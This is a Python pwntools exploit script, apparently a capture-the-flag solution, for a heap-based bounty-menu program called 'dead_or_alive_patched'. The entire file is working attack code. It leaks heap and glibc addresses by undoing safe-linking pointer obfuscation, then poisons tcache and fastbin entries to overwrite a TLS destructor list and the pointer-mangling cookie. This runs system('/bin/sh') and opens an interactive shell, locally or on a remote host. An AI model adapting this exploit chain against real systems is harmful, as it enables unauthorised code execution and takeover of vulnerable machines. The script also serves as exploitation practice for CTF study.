#!/usr/bin/env python3

from pwn import context, p64, remote, sys, u64

context.binary = 'dead_or_alive_patched'
glibc = context.binary.libc


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


def create(size: int, data: bytes, amount: int | bytes = 1337, alive: bool = True) -> int:
    io.sendlineafter(b'==> ', b'1')
    io.sendlineafter(b'Bounty amount (Zell Bars): ', str(amount).encode() if isinstance(amount, int) else amount)
    io.sendlineafter(b'Wanted alive (y/n): ', b'y' if alive else b'n')
    io.sendlineafter(b'Description size: ', str(size).encode())
    io.sendafter(b'Bounty description:\n', data)
    io.recvuntil(b'Bounty ID: ')
    return int(io.recvline().decode())


def delete(index: int):
    io.sendlineafter(b'==> ', b'2')
    io.sendlineafter(b'Bounty ID: ', str(index).encode())


def view(index: int) -> (int, bool, bytes):
    io.sendlineafter(b'==> ', b'3')
    io.sendlineafter(b'Bounty ID: ', str(index).encode())
    io.recvuntil(b'Bounty: ')
    amount = int(io.recvuntil(b' Zell Bars\nWanted alive: ', drop=True).decode())
    alive = io.recvline() == b'Yes\n'
    io.recvuntil(b'Description: ')
    return amount, alive, io.recvline().strip()


def obfuscate(ptr: int, addr: int) -> int:
    return ptr ^ (addr >> 12)


def deobfuscate(x: int, l: int = 64) -> int:
    p = 0

    for i in range(l * 4, 0, -4):
        v1 = (x & (0xf << i)) >> i
        v2 = (p & (0xf << i + 12 )) >> i + 12
        p |= (v1 ^ v2) << i

    return p


io = get_process()

a = create(0x18, b'a')
b = create(0x18, b'b')
delete(a)
delete(b)

leak_index = create(0x18, b'X')
_, _, data = view(leak_index)

heap_addr = deobfuscate(u64(data[1:].ljust(8, b'\0')) << 8) & 0xfffffffffffff000
io.info(f'Heap base address: {hex(heap_addr)}')

delete(leak_index)

to_delete = []

for _ in range(9):
    to_delete.append(create(0x18, b'asdf'))

for d in reversed(to_delete):
    delete(d)

io.sendlineafter(b'# ', b'0' * 1024)

leak_index = create(0x48, b'A' * 8, amount=b'-')
_, _, data = view(leak_index)
glibc.address = u64(data[8:].ljust(8, b'\0')) - 0x219d70
io.success(f'Glibc base address: {hex(glibc.address)}')

tls_addr = glibc.address - 0x28c0

tls_payload  = p64(0)
tls_payload += p64(tls_addr - 0x80 + 0x30)
tls_payload += p64(glibc.sym.system << 17)
tls_payload += p64(next(glibc.search(b'/bin/sh')))
tls_payload += p64(0) * 8

null_ptr_mangle_cookie = p64(0)

create(0x48, p64(heap_addr + 0x300) + p64(0x71) + p64(0x1337) + p64(0x101))
delete(create(0x64, b'asdf'))
delete(1)

create(0x48, b'B' * 8 + p64(0x71) + p64(obfuscate(tls_addr - 0x80 + 0x20, heap_addr)), amount=0x41)
create(0x64, b'asdf')

delete(create(0x38, b'asdf'))
a = create(0x38, b'a')
b = create(0x38, b'b')
delete(a)
delete(b)

create(0x28, p64(heap_addr + 0x3f0) + p64(0x41) + p64(0xacdc) + p64(0x101))
delete(a)

create(0x38, b'C' * 24 + p64(0x21) + p64(obfuscate(tls_addr + 0x30, heap_addr)))

for _ in range(3):
    create(0x18, b'Z')

for _ in range(23):
    create(0x28, b'Z')

create(0x18, null_ptr_mangle_cookie)
create(0x64, tls_payload)

io.sendlineafter(b'==> ', b'1')
io.recv()

io.interactive()
